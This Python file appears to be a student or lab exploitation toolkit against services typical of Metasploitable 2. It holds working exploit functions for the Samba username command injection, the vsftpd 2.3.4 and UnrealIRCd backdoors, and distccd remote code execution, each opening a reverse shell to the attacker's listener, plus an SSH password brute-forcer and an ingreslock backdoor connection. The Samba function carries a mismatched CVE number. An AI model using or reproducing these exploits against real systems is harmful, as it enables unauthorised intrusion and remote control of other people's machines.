from smb.SMBConnection import *
import time
from helpers import *
import paramiko
import sys
import time

def exploitSamba(rhost, lhost):
    print("Exploiting Samba 3.x/4.x (CVE-2017-7494) Remote Code Execution")

    ncListener(4444)
    time.sleep(3)

    # This is a crafted payload (See helper functions)
    info = hiddenPayload(lhost)

    # This is the complete payload
    payload = f"{info}"

    # This version of Samba does not ensure that usernames do not contain malicious code when implemented
    # This allows us to set our payload as our Username and send it to the targeted machine
    username = "`" + payload + "`"

    try:
        # SMBConnection allows us to initialize a connection over the SMB protocol
        # username is used as our username to authenticate ourself with the remote Samba server
        conn = SMBConnection(username, " ", " ", " ")

        print("Payload Sent")

        # attempt the connection with the targeted machine
        conn.connect(rhost, 445, timeout=3)

        print("Success! Check Netcat!")

    except Exception as e:
        # Redirect the error to /dev/null
        with open('/dev/null', 'w') as f:
            print(e, file=f)

def exploitVSFTP(rhost):
    print("Exploiting vsftpd 2.3.4 backdoor (CVE-2011-2523) ")

    try:
        print('Attempting Backdoor')

        # Establish connection to the FTP service and trigger the backdoor
        with socket.create_connection((rhost, 21), timeout=3) as ftpSock:
            ftpSock.sendall(b'USER EasyAccess:)\n')
            ftpSock.sendall(b'PASS ThankYou\n')
        print('Triggered Backdoor')

        # Create an interactive Terminal
        interactiveTerminal(rhost)

        time.sleep(3)

    # catch the exception
    except Exception as e:
        print(f'Failed to trigger backdoor on {rhost}: {e}')
        return

def exploitUnrealIRCd(rhost, lhost):

    print("Exploiting UnrealIRCd (CVE-2010-2075) Remote Code Execution")

    ncListener(4444)
    time.sleep(3)

    # This is a crafted payload (See helper functions)
    info = hiddenPayload(lhost)

    # This is the complete payload
    payload = f'AB; {info}'
    
    try:
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect the socket to the remote host that we have defined
        sock.connect((rhost, int(6667)))
        print(f"Connected to {rhost}:{6667}")

        # This will send the payload after converting it to bytes
        sock.send(payload.encode('utf-8'))
        print("Payload sent successfully. Check your listener for a shell.")

        # Now we close the connection
        sock.close()

    except socket.timeout:
        print("Connection timed out.")
        sys.exit(1)

    except ConnectionRefusedError:
        print("Connection refused.")
        sys.exit(1)

    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)

def exploitBruteForce(rhost):

    print("SSH Brute Force Attempt")

    # Lists of usernames and passwords
    usernames = ["root", "msfadmin", "user"]
    passwords = ["password", "msfadmin", "user"]

    # Create an object to manage the SSH connection
    client = paramiko.SSHClient()
    # Automatically add the host key of the remote system to our system for first time connections using SSH
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username in usernames:
        for password in passwords:
            try:
                # Connect to the client using the current username and password
                client.connect(rhost, 22, username, password)
                print(f"Connection Successful to {rhost} with username: {username} and password: {password}")

                # Create an interactive shell over the SSH connection
                shellSession = client.invoke_shell()

                # Ask for user input to execute on the remote machine
                while True:
                    command = input("Enter Commands ('exit' to quit): ")
                    if command.lower() == 'exit':
                        break
                    
                    # Send the command
                    shellSession.send(command + "\n")

                    # Wait for the command execution
                    time.sleep(2)

                    # Send the output back to the local host
                    while shellSession.recv_ready():
                        output = shellSession.recv(1024).decode('utf-8')
                        sys.stdout.write(output)
                
                # Close the connection
                client.close()
                
                # Exit 
                print("Successful login, exiting now...")
                return True
            
            except paramiko.AuthenticationException:
                print(f"Authentication failed for username: {username} and password: {password}")
                continue

            except Exception as e:
                print(f"Error with username: {username} and password: {password} - {e}")
                continue

            finally:
                # Close the client
                client.close()

    print("There were no matching usernames and passwords")

    return False


def exploitDistccd(rHost, lHost):
    
    print("Exploiting distccd (CVE-2004-2687) Remote Code Execution")

    ncListener(4444)
    time.sleep(3)

    port = 3632
    
    # This is a crafted payload (See helper functions)
    info = hiddenPayload(lHost)

    # combine the total payload to be sent
    completePayload = f'{info}'
    
    # Used to run the completePayload in a shell on the target machine
    # This tricks distccd to think that this is a compile
    args = ["sh", "-c", completePayload, "#", "-c", "main.c", "-o", "main.o"]

    # This code runs the completed arguments and formats them in hexidecimal
    payload = f'DIST00000001ARGC{len(args):08x}' + "".join(f"ARGV{len(arg):08x}{arg}" for arg in args)
    
    # Create a socket connection
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:

        # Stop trying to connect after 5 seconds
        socket.setdefaulttimeout(5)

        # Try to connect to the rHost on the given port
        if sock.connect_ex((rHost, port)) == 0:
            try:

                print ("triggering exploit.")
                
                # Sends the code to trigger the exploit
                sock.send(payload.encode())
                sock.send(f"DOTI0000000A{randomTextGen(10)}".encode())

                print("Successful Conection.")

            except (socket.timeout, socket.error, Exception) as e:
                
                print(f"Error: {e}")
        else:

            print(f"Failed to connect to {rHost} on port {port}")

def exploitIngreslock(rhost):
    try:
        # this defines the netcat command we will use to connect to the backdoor
        command = f"nc {rhost} 1524"
        print(f"Executing: {command}")
        
        # This opens a new terminal and runs the command
        subprocess.run(['gnome-terminal', '--', 'bash', '-c', command])
        
    except Exception as e:
        print(f"Failed to Connect: {e}")
